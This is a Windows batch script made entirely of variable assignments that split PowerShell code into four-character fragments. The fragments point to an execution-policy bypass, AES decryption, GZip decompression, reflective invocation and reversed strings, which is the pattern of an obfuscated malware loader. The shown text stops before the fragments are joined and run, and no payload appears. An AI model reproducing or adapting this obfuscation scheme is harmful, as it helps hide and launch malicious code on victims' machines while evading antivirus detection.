@echo off
set "UIeRjGhYNW=.Dis"
set "JioNCFNFkl=form"
set "LRYSwgXbjf=File"
set "WyypYqocwf=Mode"
set "jKSDxtBnWr=::De"
set "DdtldRrMKu=-1.."
set "ipkbflJjMt=; };"
set "FYBXILQUgV=comp"
set "rUpLhUKzfI= if "
set "fXiIwXOpFz=qkrH"
set "ClsHOZbfQI=yste"
set "ezZKhCHSkE=, $v"
set "SKiIOXUPaC=vJSu"
set "mycCXRbxxa=n ''"
set "lCnDCXdtfn=$foR"
set "zvsmksbsMM=Invo"
set "ZaNWdurhTd=vert"
set "gMsWCczOYy=..-1"
set "AIhFHBwpFt=k; }"
set "NxoXsXYrrl=ose("
set "gtkKNUyTIw=hy.A"
set "oJQecGugYX=ment"
set "csvBJgBVDL=[]] "
set "nGtagLaVCZ=tion"
set "JquqaFDKNi=V = "
set "ZtAgmVqlAh=m.Re"
set "NKotgVdVJu=m(, "
set "REAyNZazEE=.GZi"
set "NNcbFTdIJH=gth)"
set "qlaaReSaae=-4] "
set "xtYOcpKnaR=ateD"
set "wKZbuyKHTa=$foR"
set "leJXAtlWHH=Ajh "
set "GcDHLyrWWI=]::("
set "mnVataIuXt=;$Jm"
set "uGcYwoWaAD=ecry"
set "SBYJAiMxKB=.Com"
set "tHUeRXHQkR=Obje"
set "vlVuHgWLcP=$YqZ"
set "iNRvLcVpHh=se()"
set "zeFAaYSGpl=onve"
set "TlobVxmlsV=();$"
set "RgyYNjUSbc=[Sys"
set "HpzZaJishf=em.C"
set "JoyYsTjMBR=L) {"
set "hMuVKTNOvQ=$JRO"
set "YonMVCGizN=bypa"
set "anDhkOCgZa=e]::"
set "fjtirrUjUv=$foR"
set "pOPdvCVRvz=tem."
set "sSgmhPPTfV=.Mod"
set "AuYBDdWjcq=raph"
set "yFqCWpWAlD=lit("
set "necHKJeqsv=tem."
set "ZbUcaBNIOL='gni"
set "OJfplaWhgW=ress"
set "FMmhGOOAyn=($MZ"
set "nXcBLNcNGf=grap"
set "YWnfvabFeq=ect "
set "VVOdQPqsKX=ss -"
set "oDgNMPUNBI=:: '"
set "nlIQgAcQfS=D = "
set "bOvgJvBvup=y.Ci"
set "yIYhrNgBof=JROI"
set "VvdgWEBUwD=orF'"
set "ajQInWwFyk=.Cry"
set "oqUWAspTNx=y.Su"
set "hPgqvzJWiC=ddin"
set "JSCpwXcrrD=tsWi"
set "qAVSTINyAf=oArr"
set "BlNbizzsZv=ZYYc"
set "BcLHKkVfpM=bjec"
set "TyOOjMBnFA=lBlo"
set "cibAaIGYrK=.Sec"
set "BefKlfBtqX=in $"
set "PqwEUyVTPz=e = "
set "AnZpTmSDec=tem."
set "DxOWuQYrud=zRXq"
set "RMUFqhjZJL=ing("
set "NZGLTROvvo=gnir"
set "naxxKZNrAz=MZVR"
set "pfnPdOrahw= [Sy"
set "MnhXbhXIUS= = $"
set "JjHDRTKsas='[-1"
set "LUsyUhEuAN=isfL"
set "DDCOInYvcw=TllA"
set "VPRzFYPcnZ=Star"
set "dSQWCuQvVB=0O+g"
set "HytkBkqVuL=pose"
set "vCkzqAASzT=rofi"
set "FWrhIkKcAr=ptor"
set "zhOrmUkjOz=-joi"
set "xtgZdmtUwU=yTo("
set "suodsMuTim=3); "
